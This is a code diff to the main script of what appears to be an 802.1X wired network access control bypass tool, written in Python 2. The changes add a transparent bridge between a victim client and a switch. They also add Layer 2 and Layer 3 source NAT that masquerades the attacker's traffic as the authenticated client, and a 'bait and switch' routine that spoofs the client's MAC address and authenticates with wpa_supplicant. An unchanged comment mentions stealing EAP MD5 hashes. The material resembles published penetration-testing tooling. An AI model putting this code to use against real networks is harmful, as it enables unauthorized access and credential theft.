@@ -3,6 +3,7 @@ import os
 import time
 import json
 import sys
+import netifaces
 
 import core.utils
 import core.firewalls
@@ -18,6 +19,9 @@ from core.hostapd import Hostapd
 from core.cert_manager import cert_manager
 
 def splitter_control(configs, options):
+    ''' manual control of A/B splitters '''
+
+    print '[*] ASSUMING DIRECT CONTROL >:D'
 
     if options['upstream_splitter'] == 'connect':
         upstream_state = True
@@ -35,6 +39,7 @@ def splitter_control(configs, options):
 
 
 def cert_wizard(configs, options):
+    ''' create self-signed certificates '''
 
     while True:
 
@@ -75,24 +80,25 @@ def cert_wizard(configs, options):
     hostapd_conf.update('certs', 'private_key', settings.paths.PRIVATE_KEY)
     hostapd_conf.update('certs', 'dh_file', settings.paths.DH_FILE)
 
-def create_bridge(configs, options):
+def create_transparent_bridge(configs, options):
     ''' simple bridge without interaction '''
 
+    # user input
     bridge_iface = options['bridge']
     phy = options['phy']
     upstream = options['upstream']
     sidechannel = options['sidechannel']
     egress_port = options['egress_port']
-    client_mac = options['client_mac']
-    switch_mac = options['switch_mac']
 
-    # preliminary cleanup
+    # dynamically populated
+    upstream_mac = netifaces.ifaddresses(upstream)[netifaces.AF_LINK][0]['addr']
+    bridge = core.utils.bridge.Bridge(bridge_iface, mac=upstream_mac)
+
+    print '[*] Making sure br_netfilter kernel module is loaded by running modprobe...'
+    os.system('modprobe br_netfilter')
+
+    print '[*] Making sure IPv6 is disabled....'
     core.utils.misc.disable_ipv6()
-
-    # make sure we don't get locked out of our box
-    core.firewalls.iptables.default_accept()
-    core.firewalls.ebtables.default_accept()
-    core.firewalls.arptables.default_accept()
 
     # reset firewall rules
     core.firewalls.iptables.flush()
@@ -102,17 +108,18 @@ def create_bridge(configs, options):
     print '[*] Creating the bridge...'
 
     # create the bridge
-    bridge = core.utils.bridge.Bridge(bridge_iface, switch_mac)
     bridge.create()
     bridge.enable_8021x_forwarding()
     bridge.enable_ip_forwarding()
-    bridge.add_iface(phy, mac=switch_mac)
-    bridge.add_iface(upstream, mac=client_mac)
+    bridge.add_iface(phy)
+    bridge.add_iface(upstream)
 
-    print '[*] bringing both sides of the bridge up...'
+    print '[*] Bringing both sides of the bridge up...'
 
     # bring both sides of bridge up
     bridge.all_ifaces_up()
+
+    time.sleep(2)
 
     print '[*] Initiate radio silence...'
 
@@ -122,14 +129,74 @@ def create_bridge(configs, options):
     core.firewalls.iptables.drop_all()
     core.firewalls.arptables.drop_all()
 
-    time.sleep(2)
+    print '[*] Bringing the bridge up...'
 
-    print '[*] Bringing the bridge up with a non-routable IP...'
-
-    # bring the bridge up with a non-routable IP
-    bridge.up('169.254.66.66')
+    bridge.up('0.0.0.0')
 
     # go live
+    print '[*] Lifting radio silence...'
+    core.firewalls.arptables.allow_all()
+    core.firewalls.iptables.allow_all()
+
+    print '[*] Resetting the link...'
+    core.utils.ethtool.reset_link(upstream)
+    core.utils.ethtool.reset_link(phy)
+
+def add_interaction(configs, options):
+    ''' adds interaction to transparent bridge '''
+
+    # user input
+    bridge_iface = options['bridge']
+    phy = options['phy']
+    upstream = options['upstream']
+    sidechannel = options['sidechannel']
+    egress_port = options['egress_port']
+    client_mac = options['client_mac']
+    client_ip = options['client_ip']
+    gw_mac = options['gw_mac']
+
+    # dynamically populated
+    upstream_mac = netifaces.ifaddresses(upstream)[netifaces.AF_LINK][0]['addr']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    print '[*] Making sure br_netfilter kernel module is loaded by running modprobe...'
+    os.system('modprobe br_netfilter')
+
+    print '[*] Making sure IPv6 is disabled....'
+    core.utils.misc.disable_ipv6()
+
+    print '[*] Initiating radio silence'
+    # start dark - but make an exception for our side channel
+    core.firewalls.iptables.allow_outbound(sidechannel, port=egress_port)
+    core.firewalls.arptables.allow_outbound(sidechannel)
+    core.firewalls.iptables.drop_all()
+    core.firewalls.arptables.drop_all()
+
+    time.sleep(3)
+
+    print '[*] Bringing the bridge up...'
+
+    bridge.up('169.254.66.66')
+
+    time.sleep(3)
+
+    print '[*] Establishing Layer 2 source nat'
+    core.firewalls.ebtables.source_nat(upstream, bridge_iface, upstream_mac, client_mac, phy)
+    time.sleep(3)
+
+    print '[*] Setting default gateway and static ARP entry...'
+    print '[*] WOLOLO'
+    os.system('arp -s -i %s 169.254.66.1 %s' % (bridge_iface, gw_mac))
+    os.system('route add default gw 169.254.66.1')
+    time.sleep(3)
+    print '[*] Done.'
+
+    print '[*] Establishing Layer 3 source nat'
+    core.firewalls.iptables.source_nat(bridge_iface, '169.254.66.66', client_ip)
+    time.sleep(3)
+
+    # go live
+    print '[*] Lifting radio silence'
     core.firewalls.arptables.allow_all()
     core.firewalls.iptables.allow_all()
 
@@ -138,40 +205,51 @@ def destroy_bridge(configs, options):
     bridge_iface = options['bridge']
     bridge = core.utils.bridge.Bridge(bridge_iface)
 
+    print '[*] Destroying bridge and freeing slave interfaces...'
     bridge.all_ifaces_down()
     bridge.down()
     bridge.del_all_ifaces()
     bridge.remove()
+    print '[*] Done.'
 
 def bridge_up(configs, options):
 
+    print '[*] Bringing the bridge up.'
     bridge_iface = options['bridge']
     bridge = core.utils.bridge.Bridge(bridge_iface)
 
+    print '[*] Bringing the bridge and all slave interfaces up.'
     bridge.all_ifaces_up()
     bridge.up('0.0.0.0')
+    print '[*] Done.'
 
 def bridge_down(configs, options):
 
     bridge_iface = options['bridge']
     bridge = core.utils.bridge.Bridge(bridge_iface)
 
+    print '[*] Bringing the bridge and all slave interfaces down.'
     bridge.all_ifaces_down()
     bridge.down()
+    print '[*] Done.'
 
 def ifaces_down(configs, options):
 
     bridge_iface = options['bridge']
     bridge = core.utils.bridge.Bridge(bridge_iface)
 
+    print '[*] Bringing all slave interfaces down.'
     bridge.all_ifaces_down()
+    print '[*] Done.'
 
 def ifaces_up(configs, options):
 
     bridge_iface = options['bridge']
     bridge = core.utils.bridge.Bridge(bridge_iface)
 
+    print '[*] Bringing all slave interfaces up.'
     bridge.all_ifaces_up()
+    print '[*] Done.'
 
 # determine eap type and steal md5 hashes
 def analyze_auth_active(configs, options):
@@ -284,36 +362,84 @@ def bait_and_switch(configs, options):
 
     client_mac = options['client_mac']
     upstream = options['upstream']
+    phy = options['phy']
     netmask = options['netmask']
     client_ip = options['client_ip']
     wpa_supplicant_conf = options['wired_conf']
     use_splitters = options['use_splitters']
+    gw_ip = options['gw_ip']
 
-    # make sure upstream is down
-    os.system('ifconfig %s down' % (upstream))
+    print '[*] Making sure br_netfilter kernel module is loaded by running modprobe...'
+    os.system('modprobe br_netfilter')
+    print '[*] Done.'
+
+    print '[*] Making sure IPv6 is disabled....'
+    core.utils.misc.disable_ipv6()
+    print '[*] Done.'
+
+    print '[*] Flushing firewall rules...'
+    # reset firewall rules
+    core.firewalls.iptables.flush()
+    core.firewalls.ebtables.flush()
+    core.firewalls.arptables.flush()
+    print '[*] Done.'
 
     if use_splitters:
 
         splitters = core.splitters.Splitters()
 
+        print '[*] Placing all splitters in bypass position...'
         # start in bypass
         splitters.set_phy(False)
         splitters.set_upstream(False)
         splitters.print_state(pretty=True)
+        print '[*] Done.'
 
+    print '[*] Making sure upstream and PHY are down...'
+    # make sure upstream and phy are down
+    os.system('ifconfig %s down' % (upstream))
+    os.system('ifconfig %s down' % (phy))
+    print '[*] Done.'
+
+    print '[*] Setting MAC address of upstream to MAC address of client...'
+    # upstream mac address to mac address of client
+    os.system('macchanger -m %s %s' % (client_mac, upstream))
+    print '[*] Done.'
+
+    if use_splitters:
+
+        print '[*] Placing upstream splitter into connected position...'
         # wait a couple of seconds then connect authenticator to upstream
         # and leave PHY disconnected
         time.sleep(2)
         splitters.set_upstream(True)
-
-    # upstream mac address to mac address of client
-    os.system('macchanger -m %s %s' % (client_mac, upstream))
+        splitters.print_state(pretty=True)
+        print '[*] Done.'
 
     # set upstream NIC client's IP address
+    print '[*] Bringing upstream up with supplicant\'s IP address...'
     os.system('ifconfig %s %s netmask %s up' % (upstream, client_ip, netmask))
+    print '[*] Done.'
 
+    print '[*] Updating routing table...'
+    os.system('route add default gw %s %s' % (gw_ip, upstream))
+    print '[*] Done.'
+
+    print '[*] Authenticating using wpa_supplicant...'
     # authenticate using wpa_supplicant
     os.system('wpa_supplicant -c %s -D wired -i %s' % (wpa_supplicant_conf, upstream))
+    print '[*] Done.'
+
+
+    if use_splitters:
+
+        print '[*] Placing upstream splitter in bypass position...'
+        # wait a couple of seconds then connect authenticator to upstream
+        # and leave PHY disconnected
+        time.sleep(2)
+        splitters.set_upstream(False)
+        splitters.print_state(pretty=True)
+        print '[*] Done.'
 
 def discovery(configs, options):
 
@@ -354,7 +480,9 @@ if __name__ == '__main__':
             print json.dumps(i, indent=4, sort_keys=True)
 
     if options['create_bridge']:
-        create_bridge(core_conf, options)
+        create_transparent_bridge(core_conf, options)
+    elif options['add_interaction']:
+        add_interaction(core_conf, options)
     elif options['destroy_bridge']:
         destroy_bridge(core_conf, options)
     elif options['bridge_down']:
